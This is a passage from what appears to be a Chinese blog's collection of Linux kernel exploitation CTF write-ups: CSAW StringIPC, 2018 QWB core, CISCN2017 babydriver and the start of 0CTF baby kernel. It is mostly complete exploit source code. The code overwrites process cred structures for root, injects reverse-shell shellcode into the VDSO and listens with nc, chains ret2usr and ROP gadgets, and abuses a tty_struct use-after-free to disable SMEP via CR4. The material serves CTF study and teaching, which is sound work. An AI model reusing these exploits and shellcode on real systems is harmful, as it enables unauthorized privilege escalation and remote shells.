(fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffc80000000000; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tresult = memmem(buf, 0x1000, target, 16);\t\t// printf(&quot;0x%lx&quot;,addr);\t\tif (result)\t\t&#123;\t\t\tcred = *(size_t *)(result - 0x8);\t\t\treal_cred = *(size_t *)(result - 0x10);\t\t\tif ((cred || 0xff00000000000000) &amp;&amp; (real_cred == cred))\t\t\t&#123;\t\t\t\t// printf(&quot;[]%lx[]&quot;,result-(int)(buf));\t\t\t\ttarget_addr = addr + result - (int)(buf);\t\t\t\tprintf(&quot;[+]found task_struct 0x%lx\\n&quot;, target_addr);\t\t\t\tprintf(&quot;[+]found cred 0x%lx\\n&quot;, real_cred);\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tfor (int i = 0; i &lt; 44; i++)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = cred - 0x10 + 4 + i;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\troot_cred[0] = 0;\t\twrite_args.id = alloc_args.id;\t\twrite_args.buf = (char *)root_cred;\t\twrite_args.count = 1;\t\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\t&#125;\tif (getuid() == 0)\t&#123;\t\tprintf(&quot;[+]now you are r00t,enjoy ur shell\\n&quot;);\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse\t&#123;\t\tputs(&quot;[-] there must be something error ... &quot;);\t\texit(-1);\t&#125;\treturn 0;&#125;\n\n劫持VDSOVDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。\nvdso里的函数主要有五个\nclock_gettime\t0000000000000A10\tgettimeofday\t0000000000000C80\ttime\t0000000000000DE0\tgetcpu\t0000000000000E00\tstart\t0000000000000940\n\nVDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的\n利用方式首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。\n其次，等待某root权限的进程调用这个函数就可以利用反弹shell完成提权。\n根据上面的内存映射图，再结合vdso在内核附近，我们可以确定vdso范围0xffffffff80000000——0xffffffffffffefff\n所以思路很明显，在内核中修改函数地址为shellcode就可，所以现在就是怎么找到函数地址\n首先，获得其中gettimeofday字符串到vdso的其实位置的偏移\nint get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\terrExit(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\terrExit(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;\n\n随后在内存映射图中获取的位置进行爆破\nfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)&#123;    seek_args.id = alloc_args.id;    seek_args.index = addr - 0x10;    seek_args.whence = SEEK_SET;    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);    read_args.id = alloc_args.id;    read_args.buf = buf;    read_args.count = 0x1000;    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);    if ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))    &#123;        result = addr;        printf(&quot;[+] found vdso %lx\\n&quot;, result);        break;    &#125;&#125;\n\n这里是一页一页的搜索并且由于我们知道字符串的偏移，所以我们可以直接进行对比，所以效率还是十分高效的\n接下来就是思考在什么地方写入shellcode了，我们目前是不知道函数的执行代码在哪里，我们可以使用下面的方法拿到vdso.so文件放进ida分析\n\n\n\n可以看到gettimeofday函数的代码段是在偏移为0xc80的地方，所以我们覆盖这里为shellcode即可。\n为什么从一开始就一直说这个gettimeofday函数呢？\n上面说了这一攻击方式需要有一个有root权限的程序去执行这里面的函数，所以我们就需要一个不停的调用vdso内函数的一个程序。\n在真实环境下crontab会不停的调用搞gettimeofday函数，但是题目是qemu的模拟环境所以没有这个程序，但是题目有一个模拟的程序\n#include &lt;stdio.h&gt;int main()&#123;\twhile(1)&#123;\t\tputs(&quot;111&quot;);\t\tsleep(1);\t\tgettimeofday();\t&#125;&#125;\n\n最后综上，得出exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tint root_cred[12];\tint offset;\tchar shellcode[] = &quot;\\x90\\x53\\x48\\x31\\xC0\\xB0\\x66\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xC3\\x75\\x0F\\x48\\x31\\xC0\\xB0\\x39\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x09\\x5B\\x48\\x31\\xC0\\xB0\\x60\\x0F\\x05\\xC3\\x48\\x31\\xD2\\x6A\\x01\\x5E\\x6A\\x02\\x5F\\x6A\\x29\\x58\\x0F\\x05\\x48\\x97\\x50\\x48\\xB9\\xFD\\xFF\\xF2\\xFA\\x80\\xFF\\xFF\\xFE\\x48\\xF7\\xD1\\x51\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x2A\\x58\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x07\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\\x90\\x6A\\x03\\x5E\\x6A\\x21\\x58\\x48\\xFF\\xCE\\x0F\\x05\\x75\\xF6\\x48\\x31\\xC0\\x50\\x48\\xBB\\xD0\\x9D\\x96\\x91\\xD0\\x8C\\x97\\xFF\\x48\\xF7\\xD3\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\\x05\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05&quot;;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tprctl(PR_SET_NAME, target);\tfd = open(&quot;/dev/csaw&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tseek_args.id = alloc_args.id;\tseek_args.index = result - 0x10 + 0xc80;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = shellcode;\twrite_args.count = strlen(shellcode);\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tif (check_vsdo_shellcode(shellcode) != 0)\t&#123;\t\tputs(&quot;[+] shellcode is written into vdso, waiting for a reverse shell :&quot;);\t\tif (fork() == 0)\t\t&#123;\t\t\tprintf(&quot;gettimeofday\\n&quot;);\t\t\tsleep(1);\t\t\tvoid (*gettimeofday_addr)();\t\t\tgettimeofday_addr = 0xc80 + getauxval(AT_SYSINFO_EHDR);\t\t\tgettimeofday_addr();\t\t\texit(-1);\t\t&#125;\t\tsystem(&quot;nc -lp 3333&quot;);\t&#125;\telse\t&#123;\t\tputs(&quot;[-] someting wrong ... &quot;);\t\texit(-1);\t&#125;\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\treturn 0;&#125;\n\nexp使用的shellcode为：https://gist.github.com/itsZN/1ab36391d1849f15b785\n\n参考链接：http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO\n","categories":["Linux Kernel"],"tags":["修改cred，劫持vdso"]},{"title":"kernel pwn基础[1]","url":"/2022/03/22/kernel-pwn%E5%9F%BA%E7%A1%80-1/","content":"这里的例题仍然是上一篇的两个例题，不过使用不同的解法。\n2018 强网杯 - core上一篇里这道题使用的方法是ROP，不过这一方法相对来说比较麻烦，构造ROP链挺恼火的。\n\n可以看到并没有打开smep所以可以直接实现ret2usr。\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;size_t raw_vmlinux_base = 0xffffffff81000000;size_t commit_creds = 0, prepare_kernel_cred = 0, vmlinux_base = 0;void find_symbols()&#123;    FILE *file = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (file &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while (fgets(buf, 0x30, file))    &#123;        if (commit_creds &amp; prepare_kernel_cred)            return;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if (!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;void get_root()&#123;    char *(*pkc)(int) = prepare_kernel_cred;    void (*cc)(char *) = commit_creds;    (*cc)((*pkc)(0));&#125;void get_shell()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    ioctl(fd, 0x6677889C, 0x40);    char buf[0x30] = &#123;0&#125;;    ioctl(fd, 0x6677889B, buf);    size_t canary = ((size_t *)buf)[0];    size_t payload[0x1000] = &#123;0&#125;;    int i;    for (i = 0; i &lt; 10; i++)    &#123;        payload[i] = canary;    &#125;    payload[i++] = (size_t)get_root;    payload[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;    payload[i++] = (size_t)get_shell;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    write(fd, payload, 0x800);    ioctl(fd, 0x6677889A, 0xffffffffffff0100);&#125;\n\n可以看到这里的payload少了很多\nCISCN2017 - babydriver首先不是用之前的方法需要一定的前置知识\nsmep为了防止 ret2usr 攻击，内核开发者提出了 smep 保护，smep 全称 Supervisor Mode Execution Protection，是内核的一种保护措施，作用是当 CPU 处于 ring0 模式时，执行 用户空间的代码 会触发页错误；这个保护在 arm 中被称为 PXN。\n\n可以看到这里是打开了smep保护的。\n系统其实是根据CR4寄存器来判断是否开启smep保护，当smep位为1代表开启，反之就是关闭。所以我们只需要可以控制这里值的gadget即可。一般是采用固定的值放入CR4寄存器mov cr4, 0x6f0\n解题思路这里不使用第一种方式的话，思路大概就是先关闭smep保护，然后ret2usr。\n首先是通过UAF控制一个tty_struct结构：\nstruct tty_struct &#123;    int magic;    struct kref kref;    struct device *dev;    struct tty_driver *driver;    const struct tty_operations *ops;    int index;    /* Protects ldisc changes: Lock tty not pty */    struct ld_semaphore ldisc_sem;    struct tty_ldisc *ldisc;    struct mutex atomic_write_lock;    struct mutex legacy_mutex;    struct mutex throttle_mutex;    struct rw_semaphore termios_rwsem;    struct mutex winsize_mutex;    spinlock_t ctrl_lock;    spinlock_t flow_lock;    /* Termios values are protected by the termios rwsem */    struct ktermios termios, termios_locked;    struct termiox *termiox;    /* May be NULL for unsupported */    char name[64];    struct pid *pgrp;       /* Protected by ctrl lock */    struct pid *session;    unsigned long flags;    int count;    struct winsize winsize;     /* winsize_mutex */    unsigned long stopped:1,    /* flow_lock */              flow_stopped:1,              unused:BITS_PER_LONG - 2;    int hw_stopped;    unsigned long ctrl_status:8,    /* ctrl_lock */              packet:1,              unused_ctrl:BITS_PER_LONG - 9;    unsigned int receive_room;  /* Bytes free for queue */    int flow_change;    struct tty_struct *link;    struct fasync_struct *fasync;    wait_queue_head_t write_wait;    wait_queue_head_t read_wait;    struct work_struct hangup_work;    void *disc_data;    void *driver_data;    spinlock_t files_lock;      /* protects tty_files list */    struct list_head tty_files;#define N_TTY_BUF_SIZE 4096    int closing;    unsigned char *write_buf;    int write_cnt;    /* If the tty has a pending do_SAK, queue it here - akpm */    struct work_struct SAK_work;    struct tty_port *port;&#125; __randomize_layout;\n\n在这个结构体的有另一个结构体const struct tty_operations *ops;：\nstruct tty_operations &#123;    struct tty_struct * (*lookup)(struct tty_driver *driver,            struct file *filp, int idx);    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);    int  (*open)(struct tty_struct * tty, struct file * filp);    void (*close)(struct tty_struct * tty, struct file * filp);    void (*shutdown)(struct tty_struct *tty);    void (*cleanup)(struct tty_struct *tty);    int  (*write)(struct tty_struct * tty,              const unsigned char *buf, int count);    int  (*put_char)(struct tty_struct *tty, unsigned char ch);    void (*flush_chars)(struct tty_struct *tty);    int  (*write_room)(struct tty_struct *tty);    int  (*chars_in_buffer)(struct tty_struct *tty);    int  (*ioctl)(struct tty_struct *tty,            unsigned int cmd, unsigned long arg);    long (*compat_ioctl)(struct tty_struct *tty,                 unsigned int cmd, unsigned long arg);    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);    void (*throttle)(struct tty_struct * tty);    void (*unthrottle)(struct tty_struct * tty);    void (*stop)(struct tty_struct *tty);    void (*start)(struct tty_struct *tty);    void (*hangup)(struct tty_struct *tty);    int (*break_ctl)(struct tty_struct *tty, int state);    void (*flush_buffer)(struct tty_struct *tty);    void (*set_ldisc)(struct tty_struct *tty);    void (*wait_until_sent)(struct tty_struct *tty, int timeout);    void (*send_xchar)(struct tty_struct *tty, char ch);    int (*tiocmget)(struct tty_struct *tty);    int (*tiocmset)(struct tty_struct *tty,            unsigned int set, unsigned int clear);    int (*resize)(struct tty_struct *tty, struct winsize *ws);    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);    int (*get_icount)(struct tty_struct *tty,                struct serial_icounter_struct *icount);    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);#ifdef CONFIG_CONSOLE_POLL    int (*poll_init)(struct tty_driver *driver, int line, char *options);    int (*poll_get_char)(struct tty_driver *driver, int line);    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);#endif    int (*proc_show)(struct seq_file *, void *);&#125; __randomize_layout;\n\n可以看到这里面存在许多的函数地址指针，有之前堆的基础的就可以想到这是类似与控制vtable然后伪造函数指针来劫持程序执行流。\n不过不同的是，我们在堆中使用的是one_gadget，但是这里我们是把获得root的payload放在栈上，但是内核态的sp并不指向我们存放的payload的地址，所以动态调试看一下如何解决。\nsize_t fake_tty_operations[30] = &#123;    0xffffffff810d238d, // pop rdi; ret;    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d&#125;;int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);ioctl(fd1, 0x10001, 0x2e0); // 0x2e0是tty_struct结构体的sizeclose(fd1);int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);size_t fake_tty_struct[4] = &#123;0&#125;;read(fd2, fake_tty_struct, 32);fake_tty_struct[3] = (size_t)fake_tty_operations;write(fd2, fake_tty_struct, 32);char buf[8] = &#123;0&#125;;write(fd_tty, buf, 8);\n\n\n\n可以看到在执行到我们构造的加指针位置时的rax是指向我们构造的fake_tty_operations结构体。\n然后就是寻在gadget，不过实现rsp的转移，这里找gadget不能直接在ropper出来的内容里找，因为这不是常规的gadget所以里面不存在\ntcdy@arch-linux ~/Downloads/study_kernel % objdump -d vmlinux &gt; gadget2.txt\n\n\n\n这是两句拼接在一起的gadget，不过依旧可以正常使用。接着就是做ret2usr即可\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#define prepare_kernel_cred_addr 0xffffffff810a1810#define commit_creds_addr 0xffffffff810a1420size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;void get_root()&#123;    char *(*pkc)(int) = prepare_kernel_cred_addr;    void (*cc)(char *) = commit_creds_addr;    (*cc)((*pkc)(0));&#125;int main()&#123;    save_status();    size_t payload[32] = &#123;0&#125;;    int i = 0;    payload[i++] = 0xffffffff810d238d; // pop rdi; ret;    payload[i++] = 0x6f0;    payload[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;    payload[i++] = 0;    payload[i++] = (size_t)get_root;    payload[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff814e35ef; // iretq; ret;    payload[i++] = (size_t)get_shell;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    size_t pop_rax = 0xffffffff8100ce6e;    size_t mov_rsp_rax = 0xffffffff8181bfc5;    size_t fake_tty_operations[30] = &#123;        pop_rax,        (size_t)payload,        mov_rsp_rax,        0,        0,        0,        0,        mov_rsp_rax, // write point        0,        0,        0,        0,        0,    &#125;;    int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);    int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);    ioctl(fd1, 0x10001, 0x2e0); // 0x2e0是tty_struct结构体的size    close(fd1);    int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);    size_t fake_tty_struct[4] = &#123;0&#125;;    read(fd2, fake_tty_struct, 32);    fake_tty_struct[3] = (size_t)fake_tty_operations;    write(fd2, fake_tty_struct, 32);    char buf[8] = &#123;0&#125;;    write(fd_tty, buf, 8);&#125;\n\n","categories":["Linux Kernel"],"tags":["ret2usr","bypass semp"]},{"title":"kernel pwn基础[2]","url":"/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/","content":"2018 0CTF Finals Baby Kernel这次题目的附件只有驱动和文件系统没有bzImage\ntcdy@arch-linux ..study_kernel/2018_0CTFFinalsBabyKernel % strings baby.ko | grep vermagic=vermagic=4.15.0-22-generic SMP mod_unload\n\ntcdy@196082:~/Desktop/download/study_kernel$ sudo apt download linux-image-4.15.0-22-generic Get:1 https://mirrors.ustc.edu.cn/ubuntu bionic-updates/main amd64 linux-image-4.15.0-22-generic amd64 4.15.0-22.24 [7,875 kB]Fetched 7,875 kB in 1s (5,913 kB/s)tcdy@196082:~/Desktop/download/study_kernel$ ar x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.debtcdy@196082:~/Desktop/download/study_kernel$ tar -xf data.tar.xztcdy@196082:~/Desktop/download/study_kernel$ cd boot/tcdy@196082:~/Desktop/download/study_kernel/boot$ file vmlinuz-4.15.0-22-generic vmlinuz-4.15.0-22-generic: Linux kernel x86 boot executable bzImage, version 4.15.0-22-generic (buildd@lgw01-amd64-013) #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018, RO-rootFS, swap_dev 0x7, Normal VGA\n\n分析驱动__int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)&#123;  __int64 v2; // rdx  int i; // [rsp-5Ch] [rbp-5Ch]  __int64 v5; // [rsp-58h] [rbp-58h]  _fentry__(a1, a2);  v5 = v2;  if ( (_DWORD)a2 == 0x6666 )  &#123;    printk(&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\\n&quot;, flag);    return 0LL;  &#125;  else if ( (_DWORD)a2 == 0x1337         &amp;&amp; (unsigned __int8)_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1         &amp;&amp; (unsigned __int8)_chk_range_not_ok(                               *(_QWORD *)v5,                               *(int *)(v5 + 8),                               *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1         &amp;&amp; *(_DWORD *)(v5 + 8) == strlen(flag) )  &#123;    for ( i = 0; i &lt; strlen(flag); ++i )    &#123;      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )        return 22LL;    &#125;    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\\n&quot;, flag);    return 0LL;  &#125;  else  &#123;    return 14LL;  &#125;&#125;\n\n首先可以看到函数分为两部分，第一部分就是打印出flag的地址，第二部分则是经过两次检验之后进入下面的逐字节对比。\nbool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;  bool v3; // cf  unsigned __int64 v4; // rdi  v3 = __CFADD__(a2, a1);  v4 = a2 + a1;  return v3 || a3 &lt; v4;&#125;\n\n这个验证函数些许看不懂，直接看汇编好一点\n.text:0000000000000000 55                            push    rbp.text:0000000000000001 48 01 F7                      add     rdi, rsi.text:0000000000000004 48 89 E5                      mov     rbp, rsp.text:0000000000000007 72 08                         jb      short loc_11.text:0000000000000007.text:0000000000000009 48 39 FA                      cmp     rdx, rdi.text:000000000000000C 0F 92 C0                      setb    al.text:000000000000000F 5D                            pop     rbp.text:0000000000000010 C3                            retn.text:0000000000000010.text:0000000000000011                               ; -----------------------------------------------------------------------.text:0000000000000011.text:0000000000000011                               loc_11:                    ; CODE XREF: __chk_range_not_ok+7↑j.text:0000000000000011 B8 01 00 00 00                mov     eax, 1.text:0000000000000016 5D                            pop     rbp.text:0000000000000017 C3                            retn\n\n就是第一个参数和第二个参数的和必须小于第三个参数\n&amp;&amp; (unsigned __int8)_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1    &amp;&amp; (unsigned __int8)_chk_range_not_ok(    *(_QWORD *)v5,    *(int *)(v5 + 8),    *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952)) != 1\n\n\n可以看到这里其实就是看看传入的参数是否是用户态\n这道提分为两种利用方式，这里都提一下(毕竟我都还不会)\nDouble Fetch这一利用方式可以看做是条件竞争，这里是两次验证，第一次验证是否为用户态，第二次逐字检查flag，那么要是在第一检查结束后将地址换成正真的flag地址，那么后一个验证即可绕过\n#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;int finished = 0;int Time = 1000;size_t 